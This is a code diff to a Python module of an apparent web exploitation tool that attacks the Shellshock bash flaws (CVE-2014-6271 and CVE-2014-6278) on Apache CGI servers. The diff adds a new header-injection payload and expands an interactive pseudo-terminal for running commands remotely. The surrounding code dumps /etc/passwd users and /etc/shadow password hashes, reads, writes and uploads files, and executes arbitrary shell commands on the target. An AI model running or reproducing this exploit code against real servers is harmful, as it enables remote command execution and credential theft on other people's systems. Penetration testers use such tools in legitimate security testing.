@@ -15,8 +15,9 @@ from src.core.requests import headers
 from src.core.requests import parameters
 
 """
-This module exploits the vulnerability "CVE-2014-6271" [1] in Apache CGI.
+This module exploits the vulnerabilities CVE-2014-6271 [1], CVE-2014-6278 [2] in Apache CGI.
 [1] CVE-2014-6271: https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271
+[2] CVE-2014-6278: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
 """
 
 # Available HTTP headers
@@ -29,6 +30,7 @@ headers = [
 # Available Shellshock CVEs
 shellshock_cves = [
 "CVE-2014-6271",
+"CVE-2014-6278"
 ]
 
 """
@@ -37,6 +39,8 @@ Available shellshock payloads
 def shellshock_payloads(cve, attack_vector):
   if cve == shellshock_cves[0] :
     payload = "() { :; }; " + attack_vector
+  elif cve == shellshock_cves[1] :
+    payload = "() { _; } >_[$($())] { " + attack_vector + " } "
   else:
     pass
   return payload
@@ -155,7 +159,7 @@ def enumeration(url, cve, check_header):
             is_privilleged = ""
           print "  ("+str(count)+") '" + Style.BRIGHT + Style.UNDERLINE + fields[0]+ Style.RESET_ALL + "'" + Style.BRIGHT + is_privilleged + Style.RESET_ALL + "(uid=" + fields[1] + "). Home directory is in '" + Style.BRIGHT + fields[2]+ Style.RESET_ALL + "'." 
       else:
-        print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
+        print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
     
     #-------------------------------------
     # System password enumeration
@@ -180,7 +184,7 @@ def enumeration(url, cve, check_header):
             if fields[1] != "*" and fields[1] != "!!" and fields[1] != "":
               print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
         else:
-          print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
+          print "\n" + Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
           
 
 """
@@ -203,7 +207,7 @@ def file_access(url, cve, check_header):
       sys.stdout.flush()
       print shell
     else:
-     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
+     sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file.\n" + Style.RESET_ALL)
      sys.stdout.flush()
 
   #-------------------------------------
@@ -212,7 +216,7 @@ def file_access(url, cve, check_header):
   if menu.options.file_write:
     file_to_write = menu.options.file_write
     if not os.path.exists(file_to_write):
-      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
+      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
       sys.stdout.flush()
       sys.exit(0)
       
@@ -221,7 +225,7 @@ def file_access(url, cve, check_header):
         content = [line.replace("\n", " ") for line in content_file]
       content = "".join(str(p) for p in content).replace("'", "\"")
     else:
-      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
+      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
       sys.stdout.flush()
 
     #-------------------------------
@@ -248,7 +252,7 @@ def file_access(url, cve, check_header):
       sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
-     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
+     sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_write + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
 
   #-------------------------------------
@@ -261,7 +265,7 @@ def file_access(url, cve, check_header):
     try:
       urllib2.urlopen(file_to_upload)
     except urllib2.HTTPError, err:
-      sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
+      sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
       sys.stdout.flush()
       sys.exit(0)
       
@@ -288,7 +292,7 @@ def file_access(url, cve, check_header):
       sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
       sys.stdout.flush()
     else:
-     sys.stdout.write("\n" + Back.RED + "(x) Error: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
+     sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to write the '"+ dest_to_upload + "' file." + Style.RESET_ALL)
      sys.stdout.flush()
 
 
@@ -319,7 +323,7 @@ def shellshock_handler(url, http_request_method, filename):
 
         # Check if defined "--verbose" option.
         if menu.options.verbose:
-          sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)
+          sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
 
         header = {check_header : payload}
         request = urllib2.Request(url, None, header)
@@ -327,6 +331,8 @@ def shellshock_handler(url, http_request_method, filename):
 
         if not menu.options.verbose:
           percent = ((i*100)/total)
+          float_percent = "{0:.1f}".format(round(((i*100)/(total*1.0)),2))
+          
           if percent == 100:
             if no_result == True:
               percent = Fore.RED + "FAILED" + Style.RESET_ALL
@@ -335,7 +341,7 @@ def shellshock_handler(url, http_request_method, filename):
           elif cve in response.info():
             percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
           else:
-            percent = str(percent)+"%"
+            percent = str(float_percent )+"%"
 
           sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
           sys.stdout.flush()
@@ -368,16 +374,29 @@ def shellshock_handler(url, http_request_method, filename):
             sys.exit(0)
 
           else:
+            # Pseudo-Terminal shell
+            go_back = False
             while True:
+              if go_back == True:
+                break
               gotshell = raw_input("\n(?) Do you want a Pseudo-Terminal shell? [Y/n] > ").lower()
               if gotshell in settings.CHOISE_YES:
-                print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
+                print ""
+                print "Pseudo-Terminal (type '?' for shell options)"
                 while True:
                   try:
                     cmd = raw_input("Shell > ")
-                    if cmd == "q":
-                      logs.logs_notification(filename)
-                      sys.exit(0)
+                    if cmd.lower() in settings.SHELL_OPTIONS:
+                      if cmd.lower() == "?":
+                        menu.shell_options()
+                      elif cmd.lower() == "quit":
+                        logs.logs_notification(filename)
+                        sys.exit(0)
+                      elif cmd.lower() == "back":
+                        go_back = True
+                        break
+                      else:
+                        pass
 
                     else: 
                       shell = cmd_exec(url, cmd, cve, check_header)
@@ -400,10 +419,10 @@ def shellshock_handler(url, http_request_method, filename):
         continue
 
   except urllib2.HTTPError, err:
-    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+    print "\n" + Fore.YELLOW + "(^) Warning: " + str(err) + Style.RESET_ALL
 
   except urllib2.URLError, err:
-    print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+    print "\n" + Fore.YELLOW + "(^) Warning: " + str(err) + Style.RESET_ALL
 
 
 """
@@ -420,7 +439,7 @@ def cmd_exec(url, cmd, cve, check_header):
 
       # Check if defined "--verbose" option.
       if menu.options.verbose:
-        sys.stdout.write("\n" + Fore.GREY + payload + Style.RESET_ALL)
+        sys.stdout.write("\n" + Fore.GREY + "(~) Payload: " + payload + Style.RESET_ALL)
 
       header = { check_header : payload }
       request = urllib2.Request(url, None, header)
@@ -429,7 +448,7 @@ def cmd_exec(url, cmd, cve, check_header):
       return shell
 
     except urllib2.URLError, err:
-      print "\n" + Back.RED + "(x) Error : " + str(err) + Style.RESET_ALL
+      print "\n" + Fore.YELLOW + "(^) Warning: " + str(err) + Style.RESET_ALL
       sys.exit(0)
 
   shell = check_for_shell(url, cmd, cve, check_header)
